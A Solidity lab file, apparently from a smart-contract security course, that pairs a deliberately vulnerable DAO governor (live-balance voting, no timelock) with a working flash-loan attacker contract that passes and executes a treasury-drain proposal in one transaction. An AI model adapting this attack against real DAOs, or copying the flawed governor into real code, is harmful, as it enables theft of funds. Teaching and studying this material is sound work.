// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract GovToken {
    string public name = "GovToken";
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;

    constructor(uint256 supply) {
        totalSupply = supply;
        balanceOf[msg.sender] = supply;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        _transfer(msg.sender, to, amt);
        return true;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        allowance[from][msg.sender] -= amt;
        _transfer(from, to, amt);
        return true;
    }

    function _transfer(address from, address to, uint256 amt) internal {
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
    }
}

interface IGovFlashBorrower {
    function onGovFlashLoan(uint256 amount, uint256 fee) external;
}

/// @notice Flash-lends the governance token itself. The lending mechanism
/// is not the bug -- it's the delivery vehicle, exactly like M3.
contract GovTokenFlashLender {
    GovToken public token;
    uint256 public constant FEE_BPS = 9;

    constructor(GovToken _token) {
        token = _token;
    }

    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = token.balanceOf(address(this));
        require(amount <= balanceBefore, "insufficient liquidity");
        uint256 fee = (amount * FEE_BPS) / 10000;
        token.transfer(msg.sender, amount);
        IGovFlashBorrower(msg.sender).onGovFlashLoan(amount, fee);
        require(token.balanceOf(address(this)) >= balanceBefore + fee, "loan not repaid");
    }
}

/// @notice A DAO governor. THE BUG: voting power is read LIVE from the
/// token's current balanceOf() at vote time (not a historical snapshot
/// via checkpoints/getPastVotes), and there is no timelock between a
/// proposal passing and being executed. Both conditions together mean
/// propose -> vote -> execute can all happen in ONE transaction -- this
/// is exactly the Beanstalk Farms mechanism ($182M, April 2022), and the
/// live 2026 echo is Drift Protocol's $285M loss, which combined
/// governance manipulation with oracle abuse.
contract Governor {
    GovToken public token;
    address public treasuryTarget;
    uint256 public constant QUORUM = 500_000 * 1e18;

    struct Proposal {
        address target;
        bytes callData;
        uint256 forVotes;
        bool executed;
    }
    mapping(uint256 => Proposal) public proposals;
    uint256 public proposalCount;

    constructor(GovToken _token) {
        token = _token;
    }

    function propose(address target, bytes calldata callData) external returns (uint256 id) {
        id = proposalCount++;
        proposals[id] = Proposal({target: target, callData: callData, forVotes: 0, executed: false});
    }

    function vote(uint256 id) external {
        // BUG: live balance, not a snapshot taken at proposal creation.
        proposals[id].forVotes += token.balanceOf(msg.sender);
    }

    function execute(uint256 id) external {
        Proposal storage p = proposals[id];
        require(!p.executed, "already executed");
        require(p.forVotes >= QUORUM, "quorum not met");
        p.executed = true;
        (bool ok, ) = p.target.call(p.callData);
        require(ok, "execution failed");
    }
}

/// @notice Holds real treasury funds a passed governance proposal can move.
contract Treasury {
    GovToken public token;
    address public governor;

    constructor(GovToken _token, address _governor) {
        token = _token;
        governor = _governor;
    }

    function drain(address to, uint256 amount) external {
        require(msg.sender == governor, "not governor");
        token.transfer(to, amount);
    }
}

contract GovAttacker is IGovFlashBorrower {
    GovTokenFlashLender public lender;
    Governor public governor;
    Treasury public treasury;
    GovToken public token;
    address public owner;
    uint256 public proposalId;

    constructor(GovTokenFlashLender _lender, Governor _governor, Treasury _treasury, GovToken _token) {
        lender = _lender;
        governor = _governor;
        treasury = _treasury;
        token = _token;
        owner = msg.sender;
    }

    function attack(uint256 flashAmount, uint256 drainAmount) external {
        require(msg.sender == owner, "not owner");
        bytes memory callData = abi.encodeWithSelector(Treasury.drain.selector, address(this), drainAmount);
        proposalId = governor.propose(address(treasury), callData);
        lender.flashLoan(flashAmount);
    }

    function onGovFlashLoan(uint256 amount, uint256 fee) external override {
        require(msg.sender == address(lender), "only lender");
        governor.vote(proposalId); // huge flash-borrowed balance = huge voting power, same block
        governor.execute(proposalId); // no timelock -- executes immediately
        token.transfer(address(lender), amount + fee); // repay flash loan
    }

    function sweep() external {
        require(msg.sender == owner, "not owner");
        token.transfer(owner, token.balanceOf(address(this)));
    }
}
